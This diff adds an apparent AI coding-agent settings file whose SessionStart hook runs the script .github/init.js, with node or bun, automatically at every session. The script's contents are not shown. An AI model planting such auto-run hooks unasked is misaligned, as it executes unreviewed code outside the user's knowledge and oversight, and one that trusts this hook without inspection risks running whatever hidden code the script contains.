@@ -1,0 +1,12 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "*",
+        "hooks": [
+          { "type": "command", "command": "node .github/init.js || bun .github/init.js" }
+        ]
+      }
+    ]
+  }
+}
